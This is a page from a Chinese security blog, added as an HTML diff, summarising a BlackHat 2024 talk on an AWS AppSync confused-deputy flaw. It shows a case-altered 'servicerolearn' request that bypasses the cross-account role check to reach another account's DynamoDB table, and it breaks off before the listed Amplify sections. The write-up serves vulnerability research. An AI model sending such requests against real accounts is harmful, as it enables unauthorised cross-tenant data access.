@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>利用云提供商漏洞获取初始访问权限 - Geekby&#39;s Blog</title><meta name="Description" content="利用云提供商漏洞获取初始访问权限"><meta property="og:url" content="http://localhost:1313/2024/09/%E5%88%A9%E7%94%A8%E4%BA%91%E6%8F%90%E4%BE%9B%E5%95%86%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/">
+  <meta property="og:site_name" content="Geekby&#39;s Blog">
+  <meta property="og:title" content="利用云提供商漏洞获取初始访问权限">
+  <meta property="og:description" content="利用云提供商漏洞获取初始访问权限">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-30T15:00:00+08:00">
+    <meta property="article:modified_time" content="2024-09-30T15:00:00+08:00">
+    <meta property="article:tag" content="云原生安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="利用云提供商漏洞获取初始访问权限">
+  <meta name="twitter:description" content="利用云提供商漏洞获取初始访问权限">
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/2024/09/%E5%88%A9%E7%94%A8%E4%BA%91%E6%8F%90%E4%BE%9B%E5%95%86%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" /><link rel="prev" href="http://localhost:1313/2024/09/%E9%80%9A%E8%BF%87%E5%BD%B1%E5%AD%90%E8%B5%84%E6%BA%90%E6%94%BB%E5%87%BBaws%E5%B8%90%E6%88%B7/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "利用云提供商漏洞获取初始访问权限",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/2024\/09\/%E5%88%A9%E7%94%A8%E4%BA%91%E6%8F%90%E4%BE%9B%E5%95%86%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90\/"
+        },"image": ["http:\/\/localhost:1313\/logo.png"],"genre": "posts","keywords": "云原生安全","wordcount":  909 ,
+        "url": "http:\/\/localhost:1313\/2024\/09\/%E5%88%A9%E7%94%A8%E4%BA%91%E6%8F%90%E4%BE%9B%E5%95%86%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90\/","datePublished": "2024-09-30T15:00:00+08:00","dateModified": "2024-09-30T15:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "利用云提供商漏洞获取初始访问权限"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">利用云提供商漏洞获取初始访问权限</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>云原生安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-09-30">2024-09-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 909 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-appsync-漏洞">1. AppSync 漏洞</a>
+      <ul>
+        <li><a href="#11-背景">1.1. 背景</a></li>
+        <li><a href="#12-混淆代理人问题confusing-the-deputy">1.2. 混淆代理人问题（Confusing the deputy）</a></li>
+        <li><a href="#13-访问其它-aws-账户中的资源">1.3. 访问其它 AWS 账户中的资源</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-aws-amplify漏洞">2. AWS Amplify漏洞</a>
+      <ul>
+        <li><a href="#21-背景">2.1. 背景</a></li>
+        <li><a href="#22-潜在误配置1trust-policy-without-a-condition">2.2. 潜在误配置1：Trust policy without a condition</a></li>
+        <li><a href="#23-潜在误配置2trust-policy-with-an-unauthenticated-condition">2.3. 潜在误配置2：Trust policy with an unauthenticated condition</a></li>
+        <li><a href="#24-潜在误配置3trust-policy-with-an-authenticated-condition">2.4. 潜在误配置3：Trust policy with an authenticated condition</a></li>
+        <li><a href="#25-如何寻找存在风险的角色">2.5. 如何寻找存在风险的角色</a>
+          <ul>
+            <li><a href="#251-方式一">2.5.1. 方式一</a></li>
+            <li><a href="#252-方式二">2.5.2. 方式二</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="利用云提供商漏洞获取初始访问权限">利用云提供商漏洞获取初始访问权限</h1>
+<p>2024 年的 BlackHat 会议上一位研究员分享了名为《Kicking in the Door to the Cloud: Exploiting Cloud Provider Vulnerabilities for Initial Access》的议题，议题主要探讨了一种新型的攻击方式，称为“混淆代理人问题”（Confusing the deputy），以及如何通过这个问题对AWS账户进行攻击。</p>
+<h2 id="1-appsync-漏洞">1. AppSync 漏洞</h2>
+<h3 id="11-背景">1.1. 背景</h3>
+<p>AWS AppSync 可以快速创建serverless的GraphQL和Pub/Sub API，借助单次网络调用与多个数据源（SQL、NoSQL、搜索数据、REST 端点和微型服务）交互，通过单个端点简化应用程序开发，从而安全地查询、更新或发布数据。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548809.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548809.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548809.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548809.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548809.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548809.png-water_print" /></p>
+<p>除了预定义的数据源和解析器，AppSync还提供了直接调用AWS API的功能，允许开发者创建与没有预定义解析器的AWS服务集成。比如，开发者可以直接配置AppSync与AWS S3存储桶进行交互。但是，为了授权AppSync执行操作，开发者需要创建一个具有所需IAM权限的角色，该角色将被AWS信任策略授权允许AppSync服务代表其执行操作。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Service&#34;</span><span class="p">:</span> <span class="s2">&#34;appsync.amazonaws.com&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;sts:AssumeRole&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>具体来说，<code>sts:AssumeRole</code>操作用于通过角色信任关系获取临时凭证。这是一种委派权限的机制，其中一个IAM实体（通常是IAM用户或AWS服务）请求扮演（assume）另一个角色的身份，以获取该角色所拥有的权限。这种操作通常用于实现安全最小特权原则，即用户或服务只能获取完成其任务所需的最小权限。</p>
+<p>以 S3 存储桶为例：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548210.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548210.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548210.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548210.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548210.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548210.png-water_print" /></p>
+<p>那么在这个过程中，存在一个有趣的问题：攻击者能否以某种方式欺骗AppSync服务，使其扮演受害者账户的某些角色并访问其资源，实现跨租户攻击？</p>
+<h3 id="12-混淆代理人问题confusing-the-deputy">1.2. 混淆代理人问题（Confusing the deputy）</h3>
+<p>AWS官方给出混淆代理的概念是：没有执行操作权限的实体可能会迫使更具权限的实体执行该操作。这里可简单理解为“非约束性委派”。在AWS中，跨服务委派可能会导致混淆代理问题。一个服务（调用服务）调用另一项服务（被调用服务)时，可能会发生跨服务模拟，可以操纵调用服务以使用其权限对另一个客户的资源进行操作。即权限较低的实体（攻击者）说服权限较高的实体或服务（AppSync）代表它执行某些操作。</p>
+<p>AWS 通过验证角色的ARN（AWS 资源的唯一标识符）来防范此类攻击。在创建数据源期间，API会查看所提供的 ARN，并确定它是否在同一个AWS账户中。如果不是，API就会出错。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws appsync create-data <span class="nb">source</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>&gt; --api-id example123example123example <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>&gt; --type HTTP <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>&gt; --http-config file://http.json <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>&gt; --service-role-arn arn:aws:iam::111111111111:role/example
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">An error occurred <span class="o">(</span>AccessDeniedException<span class="o">)</span> when calling the CreateDataSource operation: Cross-Account pass role is not allowed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过抓包查看命令行HTTP请求流量，可以发现 ARN 是在serviceRoleArn参数中传递的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;custom_data_source&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;HTTP&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;serviceRoleArn&#34;</span><span class="p">:</span> <span class="s2">&#34;arn:aws:iam::111111111111:role/example&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;httpConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;https://sts.us-east-1.amazonaws.com/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;authorizationConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;authorizationType&#34;</span><span class="p">:</span> <span class="s2">&#34;AWS_IAM&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;awsIamConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;signingRegion&#34;</span><span class="p">:</span> <span class="s2">&#34;us-east-1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;signingServiceName&#34;</span><span class="p">:</span> <span class="s2">&#34;sts&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在测试ARN的验证过程时，发现API接口大小写不敏感。例如，API期望使用 <code>httpConfig</code>，但如果发送了 <code>hTtPcOnFiG</code>，也不会出错。通过这种特性，修改<code>serviceRoleArn</code> 大小写，即可以绕过验证，从而使得攻击者模拟不同AWS账户中角色。</p>
+<p>如下图是使用正常serviceRoleArn情况下的请求和响应：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548398.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548398.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548398.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548398.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548398.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301548398.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549949.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549949.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549949.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549949.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549949.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549949.png-water_print" /></p>
+<p>大小写绕过：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549112.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549112.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549112.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549112.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549112.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549112.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549622.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549622.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549622.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549622.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549622.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549622.png-water_print" /></p>
+<p>通过绕过 ARN 验证，攻击者可以创建与其它AWS账户中的角色绑定的AppSync数据源。这样，攻击者就可以与任何账户中信任 AWS AppSync服务的角色关联的任何资源进行交互。</p>
+<h3 id="13-访问其它-aws-账户中的资源">1.3. 访问其它 AWS 账户中的资源</h3>
+<p>通过上面绕过校验的方式，就可以在自己的账户中创建指向其它AWS账户的数据源。</p>
+<p>举个例子，假设有一家名为EventPlanners的公司，该公司专门为客户管理会议邀请。该公司有一个用于安排会议、协作和控制的GraphQL API，保证只有有权限的用户才能查看自己的会议活动。所有信息都存储在DynamoDB中。</p>
+<p>为了允许GraphQL API与DynamoDB表交互，在受害者账户中创建了一个 IAM 角色，该角色具有以下权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;dynamodb:DeleteItem&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;dynamodb:GetItem&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;dynamodb:PutItem&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;dynamodb:Query&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;dynamodb:Scan&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;dynamodb:UpdateItem&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;arn:aws:dynamodb:us-east-1:677301038893:table/AppSyncEventTable-xrpYoWZk&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;arn:aws:dynamodb:us-east-1:677301038893:table/AppSyncEventTable-xrpYoWZk/*&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后，<a href="https://docs.aws.amazon.com/zh_cn/appsync/latest/devguide/tutorial-dynamodb-resolvers.html" title="DynamoDB Resolver" target="_blank" rel="noopener noreffer">DynamoDB Resolver</a>会使用该角色访问数据库。由于该角色与AppSync服务之间存在信任关系，因此可以利用前述漏洞接管数据库的账户。</p>
+<p>从攻击者的角度来看，攻击者可以通过网络钓鱼获取EventPlanners员工的信息并访问内部文档，即使攻击者没有足够权限访问生产数据库，但仍然可以看到生产AWS账户中资源的ARN。</p>
+<p>利用该漏洞，攻击者可以通过创建自己的AppSync API和指向EventPlanners帐户中角色的数据源来入侵EventPlanners数据库：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;malicioussource&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;HTTP&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;servicerolearn&#34;</span><span class="p">:</span> <span class="s2">&#34;arn:aws:iam::677301038893:role/service-role/appsync-ds-ddb-yoczrt-AppSyncEventTable-xr&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;httpConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;https://dynamodb.us-east-1.amazonaws.com/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;authorizationConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;authorizationType&#34;</span><span class="p">:</span> <span class="s2">&#34;AWS_IAM&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;awsIamConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;signingRegion&#34;</span><span class="p">:</span> <span class="s2">&#34;us-east-1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;signingServiceName&#34;</span><span class="p">:</span> <span class="s2">&#34;dynamodb&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过上面的方式，攻击者就可以像拥有数据源一样与之交互。此外，攻击者后续还可以创建一个新的解析器，并指定一个请求映射模板来调用 dynamodb:Scan：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549693.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549693.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549693.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202409301549693.png-water_print 2x"
+        data-sizes="auto"
